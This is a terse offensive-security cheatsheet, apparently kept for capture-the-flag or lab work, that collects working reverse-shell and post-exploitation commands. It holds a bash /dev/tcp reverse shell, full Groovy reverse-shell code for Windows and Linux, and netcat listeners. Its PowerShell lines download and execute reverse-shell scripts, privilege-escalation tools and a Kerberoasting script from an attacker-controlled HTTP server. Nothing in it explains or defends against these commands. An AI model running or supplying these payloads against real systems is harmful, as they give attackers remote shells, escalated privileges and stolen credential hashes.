# Netcat Cheatsheet

## Open Netcat Server

- nc -lv localhost 8782
- ncat -lvnp 1234

## target windows

- stty raw -echo; (stty size; cat) | ncat -lvnp 1337

## Spawn Ngrok Server

- ngrok tcp 8782

## Payload Client

- <https://www.revshells.com>
- <https://bit.ly/3yNL1hg>
- sh -i >& /dev/tcp/10.9.2.251/1234 0>&1

## Spawn TTY

- python -c 'import pty; pty.spawn("/bin/sh")'
- python -c 'import pty; pty.spawn("/bin/bash")'

## Spawn python server

python3 -m http.server 9000

## Groovy :

- Windows
String host="10.9.2.251";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

- Linux
String host="10.9.2.251";
int port=1234;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


## powershell cheatsheet

- powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.168.173 1337

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.2.251:9000/payload/windows/revshellwindow.ps1');Invoke-ConPtyShell 10.9.2.251 1338

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.2.251:9000/payload/windows/revshellwindowold.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.9.2.251 -Port 1338

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/payload/payload.bat','payload.bat')"

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/linpeas/peass.exe','peass.exe')"

- Start-Process "payload.bat"

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.1.25:9000/printspoofer.exe','printspoofer.exe')"

- powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.2.251:9000/payload/windows/kerberoast.ps1','powerup.ps1')"

- powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.2.251:9000/payload/windows/kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat ​ |fl
